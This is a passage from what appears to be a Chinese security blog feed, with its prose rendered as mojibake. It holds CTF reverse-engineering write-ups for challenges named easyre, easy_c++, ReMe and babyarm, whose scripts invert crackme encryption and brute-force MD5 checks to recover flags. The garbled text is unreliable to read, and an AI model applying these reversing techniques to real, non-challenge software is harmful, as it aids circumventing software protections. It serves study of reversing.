class="number">0x03cf09b3</span>, <span class="number">0x093cb610</span>, <span class="number">0x0d41ea64</span>, <span class="number">0x07648050</span>,</span><br><span class="line"><span class="number">0x092039bf</span>, <span class="number">0x08e7f1f7</span>, <span class="number">0x004d871f</span>, <span class="number">0x1680f823</span>,</span><br><span class="line"><span class="number">0x06f3c3eb</span>, <span class="number">0x2205134d</span>, <span class="number">0x015c6a7c</span>, <span class="number">0x11c67ed0</span>,</span><br><span class="line"><span class="number">0x0817b32e</span>, <span class="number">0x06bd9b92</span>, <span class="number">0x08806b0c</span>, <span class="number">0x06aaa515</span>,</span><br><span class="line"><span class="number">0x205b9f76</span>, <span class="number">0x0de963e9</span>, <span class="number">0x2194e8e2</span>, <span class="number">0x047593bc</span> &#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> input = <span class="number">0x20</span>; input &lt; <span class="number">0x7e</span>; input++)</span><br><span class="line">&#123;</span><br><span class="line">a = input*input*data[i]+ data[i + <span class="number">32</span>] * input+ data[i + <span class="number">64</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (a == result[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, input);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">getchar();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//8eb5d8b632dae2a5167e3e1c4884eef9</span></span><br></pre></td></tr></table></figure><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><p>ç›´æ¥æ‹–å…¥idaåˆ†æå®Œmainå‡½æ•°åæ²¡æœ‰å‘ç°åŠ å¯†åˆ¤æ–­å‡½æ•°ï¼Œç›´æ¥åŠ¨è°ƒè·Ÿæµç¨‹ï¼Œä¹Ÿå¾ˆç®€å•ï¼Œæ•´ç†äº†ä¸‹åŠ å¯†ä¸æœ€åæ¯”è¾ƒæ•°æ®çš„ç¬”è®°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">a = input[<span class="number">0</span>] &lt;&lt; <span class="number">3</span></span><br><span class="line">b = input[<span class="number">1</span>] &gt;&gt; <span class="number">5</span></span><br><span class="line">a = a|b</span><br><span class="line">a = a ^ i;</span><br><span class="line"></span><br><span class="line">input[i] = (input[i] &lt;&lt; <span class="number">3</span>) | (input[(i+<span class="number">1</span>)%<span class="number">24</span>] &amp; <span class="number">0xE0</span>) &gt;&gt; <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">43</span>,   <span class="number">8</span>, <span class="number">169</span>, <span class="number">200</span>, <span class="number">151</span>,  <span class="number">47</span>, <span class="number">255</span>, <span class="number">140</span>, <span class="number">146</span>, <span class="number">240</span>, </span><br><span class="line">  <span class="number">163</span>, <span class="number">137</span>, <span class="number">247</span>,  <span class="number">38</span>,   <span class="number">7</span>, <span class="number">164</span>, <span class="number">218</span>, <span class="number">234</span>, <span class="number">179</span>, <span class="number">145</span>, </span><br><span class="line">  <span class="number">239</span>, <span class="number">220</span>, <span class="number">149</span>, <span class="number">171</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">sar:ç®—æœ¯å³ç§»æŒ‡ä»¤ã€‚å³ç§»æ—¶ä¿ç•™æ“ä½œæ•°çš„ç¬¦å·ï¼Œå³ç”¨ç¬¦å·ä½æ¥è¡¥è¶³ã€‚</span><br><span class="line">shr:é€»è¾‘å³ç§»æŒ‡ä»¤ã€‚å³ç§»æ—¶æ€»æ˜¯ç”¨<span class="number">0</span>æ¥è¡¥è¶³ã€‚</span><br></pre></td></tr></table></figure><p>è§£å¯†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">43</span>,   <span class="number">8</span>, <span class="number">169</span>, <span class="number">200</span>, <span class="number">151</span>,  <span class="number">47</span>, <span class="number">255</span>, <span class="number">140</span>, <span class="number">146</span>, <span class="number">240</span>, </span><br><span class="line">  <span class="number">163</span>, <span class="number">137</span>, <span class="number">247</span>,  <span class="number">38</span>,   <span class="number">7</span>, <span class="number">164</span>, <span class="number">218</span>, <span class="number">234</span>, <span class="number">179</span>, <span class="number">145</span>, </span><br><span class="line">  <span class="number">239</span>, <span class="number">220</span>, <span class="number">149</span>, <span class="number">171</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ch1 = <span class="number">0</span>;</span><br><span class="line">ch1 = (ida_chars[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>) | (ida_chars[<span class="number">23</span>] &lt;&lt; <span class="number">5</span>);</span><br><span class="line"><span class="built_in">putchar</span>(ch1);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">23</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">ch1 = (((ida_chars[i]^i) &gt;&gt; <span class="number">3</span>) | ((ida_chars[i<span class="number">-1</span>]^(i<span class="number">-1</span>)) &lt;&lt; <span class="number">5</span>))&amp;<span class="number">0xff</span>;</span><br><span class="line"><span class="built_in">putchar</span>(ch1);</span><br><span class="line">&#125;</span><br><span class="line">ch1 = (ida_chars[<span class="number">23</span>] &gt;&gt; <span class="number">3</span> ) | ((ida_chars[<span class="number">22</span>]^<span class="number">22</span>) &lt;&lt; <span class="number">5</span>);</span><br><span class="line"><span class="built_in">putchar</span>(ch1);</span><br><span class="line"><span class="comment">//ea5yre_1s_50_ea5y_t0_y0u</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="easy-c"><a href="#easy-c" class="headerlink" title="easy_c++"></a>easy_c++</h3><p>å¾ˆç®€å•ï¼Œidaæ‰“å¼€åç®€å•åˆ†æä»¥ä¸‹ï¼Œåªæ˜¯å¯¹è¾“å…¥è¿›è¡Œäº†ä¸€ä¸ªå¼‚æˆ–ï¼Œç„¶åä¸æŒ‡å®šç¼–ç å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒã€‚ã€‚</p><p>ç›´æ¥åœ¨ida-pythonè§£å†³ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'7d21e&lt;e3&lt;:3;9;ji t r#w\"$*&#123;*+*$|,'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    flag += chr(ord(s[i])^i)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#7e02a9c4439056df0e2a7b432b0069b3</span></span><br></pre></td></tr></table></figure><h3 id="ReMe"><a href="#ReMe" class="headerlink" title="ReMe"></a>ReMe</h3><p>é¦–å…ˆä»ç¨‹åºå›¾æ ‡å¯ä»¥æƒ³åˆ°pythonï¼Œç„¶åidaè½½å…¥æŸ¥çœ‹å­—ç¬¦ä¸²ï¼Œå‘ç°å¾ˆå¤šPYç›¸å…³çš„å­—ç¬¦ä¸”ç¨‹åºä¸å¯»å¸¸ã€‚è¿™æ—¶å€™åŸºæœ¬å¯ä»¥ç¡®å®šæ˜¯pythonæ‰“åŒ…æˆçš„exeç¨‹åºäº†ã€‚</p><p>ç„¶åä½¿ç”¨<strong>python pyinstxtractor.py ReMe.exe</strong>è§£åŒ…ï¼Œä»å¾—åˆ°çš„åŒ…é‡Œå¯ä»¥pycæ–‡ä»¶çœ‹åˆ°ReMeï¼Œä½†æ˜¯ç¼ºå°‘æ–‡ä»¶å¤´çš„ï¼Œæ‰¾åˆ°åŒ…é‡Œçš„å¦ä¸€ä¸ªstuctæ–‡ä»¶ï¼Œå¯¹ReMeçš„æ–‡ä»¶å¤´è¿›è¡Œè¡¥é½ã€‚</p><p><img src="/2020/11/02/2020%E6%B9%96%E6%B9%98%E6%9D%AF/909254_VRZ57MQQAC3H4EX.png" alt="https://bbs.pediy.com/upload/attach/202011/909254_VRZ57MQQAC3H4EX.png"></p><p>ä½¿ç”¨<strong>uncompyle6 -o re.py ReMe.pyc</strong>è½¬åŒ–ä¸ºpyæ–‡ä»¶ã€‚</p><p>pyä»£ç å¾ˆç®€å•ï¼ŒæŠŠåŸæ¥çš„ä»£ç ç¨å¾®ä¿®æ”¹ä»¥ä¸‹å¯ä»¥ç›´æ¥çˆ†ç ´å‡ºflagï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, hashlib</span><br><span class="line">check = [</span><br><span class="line"> <span class="string">'e5438e78ec1de10a2693f9cffb930d23'</span>,</span><br><span class="line"> <span class="string">'08e8e8855af8ea652df54845d21b9d67'</span>,</span><br><span class="line"> <span class="string">'a905095f0d801abd5865d649a646b397'</span>,</span><br><span class="line"> <span class="string">'bac8510b0902185146c838cdf8ead8e0'</span>,</span><br><span class="line"> <span class="string">'f26f009a6dc171e0ca7a4a770fecd326'</span>,</span><br><span class="line"> <span class="string">'cffd0b9d37e7187483dc8dd19f4a8fa8'</span>,</span><br><span class="line"> <span class="string">'4cb467175ab6763a9867b9ed694a2780'</span>,</span><br><span class="line"> <span class="string">'8e50684ac9ef90dfdc6b2e75f2e23741'</span>,</span><br><span class="line"> <span class="string">'cffd0b9d37e7187483dc8dd19f4a8fa8'</span>,</span><br><span class="line"> <span class="string">'fd311e9877c3db59027597352999e91f'</span>,</span><br><span class="line"> <span class="string">'49733de19d912d4ad559736b1ae418a7'</span>,</span><br><span class="line"> <span class="string">'7fb523b42413495cc4e610456d1f1c84'</span>,</span><br><span class="line"> <span class="string">'8e50684ac9ef90dfdc6b2e75f2e23741'</span>,</span><br><span class="line"> <span class="string">'acb465dc618e6754de2193bf0410aafe'</span>,</span><br><span class="line"> <span class="string">'bc52c927138231e29e0b05419e741902'</span>,</span><br><span class="line"> <span class="string">'515b7eceeb8f22b53575afec4123e878'</span>,</span><br><span class="line"> <span class="string">'451660d67c64da6de6fadc66079e1d8a'</span>,</span><br><span class="line"> <span class="string">'8e50684ac9ef90dfdc6b2e75f2e23741'</span>,</span><br><span class="line"> <span class="string">'fe86104ce1853cb140b7ec0412d93837'</span>,</span><br><span class="line"> <span class="string">'acb465dc618e6754de2193bf0410aafe'</span>,</span><br><span class="line"> <span class="string">'c2bab7ea31577b955e2c2cac680fb2f4'</span>,</span><br><span class="line"> <span class="string">'8e50684ac9ef90dfdc6b2e75f2e23741'</span>,</span><br><span class="line"> <span class="string">'f077b3a47c09b44d7077877a5aff3699'</span>,</span><br><span class="line"> <span class="string">'620741f57e7fafe43216d6aa51666f1d'</span>,</span><br><span class="line"> <span class="string">'9e3b206e50925792c3234036de6a25ab'</span>,</span><br><span class="line"> <span class="string">'49733de19d912d4ad559736b1ae418a7'</span>,</span><br><span class="line"> <span class="string">'874992ac91866ce1430687aa9f7121fc'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(num)</span>:</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">while</span> num != <span class="number">1</span>:</span><br><span class="line">        num = num * <span class="number">3</span> + <span class="number">1</span> <span class="keyword">if</span> num % <span class="number">2</span> <span class="keyword">else</span> num // <span class="number">2</span></span><br><span class="line">        result.append(num)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">27</span>):</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">ret_list = func(ch)</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> range(len(ret_list)):</span><br><span class="line">s += str(ret_list[idx])</span><br><span class="line">s += str(ret_list[(len(ret_list) - idx - <span class="number">1</span>)])</span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(s.encode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="keyword">if</span> md5.hexdigest() == check[i]:</span><br><span class="line">flag += chr(ch)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(flag.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">   print(<span class="string">'flag&#123;'</span> + md5.hexdigest() + <span class="string">'&#125;'</span>)</span><br><span class="line">    </span><br><span class="line">   <span class="comment">#flag&#123;0584cfa2ce502951ef5606f6b99fc921&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>X-nuca 2020</title>
      <link href="/2020/10/31/X-nuca-2020/"/>
      <url>/2020/10/31/X-nuca-2020/</url>
      
        <content type="html"><![CDATA[<p>ç¬¬ä¸€æ¬¡æ‰“è¿™ä¸ªæ¯”èµ›ï¼Œé¢˜ç›®éƒ½åéš¾å§ã€‚ã€‚åšäº†ä¸€ä¸ªarmæ¶æ„çš„é¢˜ï¼Œç„¶åUnravelMFCè¿™ä¸ªé¢˜ï¼Œæ¯”èµ›æ—¶å­¦é•¿å¸ˆå‚…åšäº†ï¼Œå°±æ²¡åšäº†ï¼Œèµ›åæŠŠå®ƒå¤ç°äº†ä¸‹ã€‚</p><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1zD_x5Z_2ktIWjFzoOKn_5A" target="_blank" rel="noopener">https://pan.baidu.com/s/1zD_x5Z_2ktIWjFzoOKn_5A</a><br>æå–ç ï¼šmflo<br>å¤åˆ¶è¿™æ®µå†…å®¹åæ‰“å¼€ç™¾åº¦ç½‘ç›˜æ‰‹æœºAppï¼Œæ“ä½œæ›´æ–¹ä¾¿å“¦</p><a id="more"></a><h1 id="babyarm"><a href="#babyarm" class="headerlink" title="babyarm"></a>babyarm</h1><p>è¿›å…¥ç¨‹åºç›´æ¥çœ‹åˆ°å‡çš„ç¨‹åºæµç¨‹ã€‚ã€‚çœ‹äº†ä¸‹å‡½æ•°ï¼Œç„¶ågdbå¼€ä¸€ä¸ªç«¯å£ä¸æ–­è°ƒè¯•è·Ÿæ‰¾åˆ°å…³é”®å‡½æ•°ã€‚å…¶å®ä»<strong>ELF Initialization Function Table</strong> ä¹Ÿå¯ä»¥çœ‹è§å…³é”®åŠ å¯†å‡½æ•°ï¼š<strong>sub_114D8</strong>ã€‚</p><p><img src="/2020/10/31/X-nuca-2020/image-20201105163344611.png" alt="image-20201105163344611"></p><p>ç¡®å®šå…³é”®å‡½æ•°åä¸æ–­è°ƒè¯•ã€‚ã€‚ä»è°ƒè¯•çœ‹åˆ°ï¼Œé¦–å…ˆå¯¹è¾“å…¥å­—ç¬¦hexï¼Œç„¶åå†byes.fromhex()ï¼Œæ‰€ä»¥æœ€åå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ã€‚</p><p>å‰©ä¸‹å°±æ˜¯æ…¢æ…¢æ•´ç†æ•°æ®ï¼Œè§£å¯†ã€‚ã€‚å¾ªç¯åŠ å¯†æ•°æ®ã€‚ã€‚</p><p>åŠ å¯†ä¸­2ä¸­å–å·²ç»ç¼–ç æ•°æ®çš„è¡¨è¾¾å¼éœ€è¦æ³¨æ„ä¸€ä¸‹ï¼ŒåŠ¨è°ƒå¯ä»¥å¾ˆæ˜ç™½ã€‚</p><p><strong>(_DWORD *)(&amp;v40 + (v17 &amp; 0xC) - 20)</strong></p><p><strong>(*((_DWORD *)&amp;v40 + (((unsigned __int8)(v17 &gt;&gt; 2) ^ 1) &amp; 3) - 5)</strong></p><p>é¦–å…ˆå–å‡ºæœ€åæ¯”è¾ƒçš„å¯†æ–‡å˜æˆ16ä¸ª4å­—èŠ‚æ•°æ®ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0xF0</span>, <span class="number">0x61</span>, <span class="number">0xB0</span>, <span class="number">0x7E</span>, <span class="number">0x56</span>, <span class="number">0xC8</span>, <span class="number">0xB3</span>, <span class="number">0xC7</span>, <span class="number">0xA3</span>, </span><br><span class="line">  <span class="number">0x52</span>, <span class="number">0x99</span>, <span class="number">0x3F</span>, <span class="number">0x2D</span>, <span class="number">0x1C</span>, <span class="number">0x45</span>, <span class="number">0x67</span>, <span class="number">0x22</span>, <span class="number">0xE3</span>, <span class="number">0x3E</span>, </span><br><span class="line">  <span class="number">0x3E</span>, <span class="number">0x2B</span>, <span class="number">0xE2</span>, <span class="number">0xE3</span>, <span class="number">0x50</span>, <span class="number">0xA2</span>, <span class="number">0xE5</span>, <span class="number">0x43</span>, <span class="number">0xD0</span>, <span class="number">0x8E</span>, </span><br><span class="line">  <span class="number">0xB2</span>, <span class="number">0x59</span>, <span class="number">0xDC</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x0F</span>, <span class="number">0x83</span>, <span class="number">0xD0</span>, <span class="number">0xF4</span>, <span class="number">0x9B</span>, </span><br><span class="line">  <span class="number">0x10</span>, <span class="number">0x81</span>, <span class="number">0x57</span>, <span class="number">0x8A</span>, <span class="number">0x4F</span>, <span class="number">0xEC</span>, <span class="number">0x04</span>, <span class="number">0x86</span>, <span class="number">0x7F</span>, <span class="number">0xA2</span>, </span><br><span class="line">  <span class="number">0xB5</span>, <span class="number">0x2E</span>, <span class="number">0xF3</span>, <span class="number">0xDD</span>, <span class="number">0x17</span>, <span class="number">0x12</span>, <span class="number">0x53</span>, <span class="number">0xB2</span>, <span class="number">0xC9</span>, <span class="number">0x93</span>, </span><br><span class="line">  <span class="number">0x43</span>, <span class="number">0x8E</span>, <span class="number">0x7F</span>, <span class="number">0xDC</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i += <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%#x "</span>, *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(ida_chars+i));</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*unsigned int v32 = 0xb061f013;</span></span><br><span class="line"><span class="comment">unsigned int v28 = 0xb3c8567e;</span></span><br><span class="line"><span class="comment">unsigned int v25 = 0x9952a3c7;</span></span><br><span class="line"><span class="comment">unsigned int v29 = 0x451c2d3f;</span></span><br><span class="line"><span class="comment">unsigned int v26 = 0x3ee32267;</span></span><br><span class="line"><span class="comment">unsigned int v27 =  0xe3e22b3e;</span></span><br><span class="line"><span class="comment">unsigned int v10 = 0x43e5a250;</span></span><br><span class="line"><span class="comment">unsigned int v30 = 0x59b28ed0;</span></span><br><span class="line"><span class="comment">unsigned int v31 = 0xf8649dc;</span></span><br><span class="line"><span class="comment">unsigned int v11 = 0x9bf4d083;</span></span><br><span class="line"><span class="comment">unsigned int v12 = 0x8a578110;</span></span><br><span class="line"><span class="comment">unsigned int v13 = 0x8604ec4f;</span></span><br><span class="line"><span class="comment">unsigned int v14 = 0x2eb5a27f;</span></span><br><span class="line"><span class="comment">unsigned int v15 = 0x1217ddf3;</span></span><br><span class="line"><span class="comment">unsigned int v16 = 0x93c9b253;</span></span><br><span class="line"><span class="comment">unsigned int v33 = 0xdc7f8e43;*/</span></span><br></pre></td></tr></table></figure><p>è§£å¯†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v32 = <span class="number">0xb061f013</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v28 = <span class="number">0xb3c8567e</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v25 = <span class="number">0x9952a3c7</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v29 = <span class="number">0x451c2d3f</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v26 = <span class="number">0x3ee32267</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v27 = <span class="number">0xe3e22b3e</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v10 = <span class="number">0x43e5a250</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v30 = <span class="number">0x59b28ed0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v31 = <span class="number">0xf8649dc</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v11 = <span class="number">0x9bf4d083</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v12 = <span class="number">0x8a578110</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v13 = <span class="number">0x8604ec4f</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v14 = <span class="number">0x2eb5a27f</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v15 = <span class="number">0x1217ddf3</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v16 = <span class="number">0x93c9b253</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v33 = <span class="number">0xdc7f8e43</span>;</span><br><span class="line"><span class="comment">//unsigned int v33 = 0;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v17 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v40 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v18 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> ans[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ans1[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> v19;</span><br><span class="line"><span class="keyword">int</span> v34 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">ans[<span class="number">12</span>] = <span class="number">4</span>;</span><br><span class="line">ans[<span class="number">8</span>] = <span class="number">3</span>;</span><br><span class="line">ans[<span class="number">4</span>] = <span class="number">2</span>;</span><br><span class="line">ans[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span 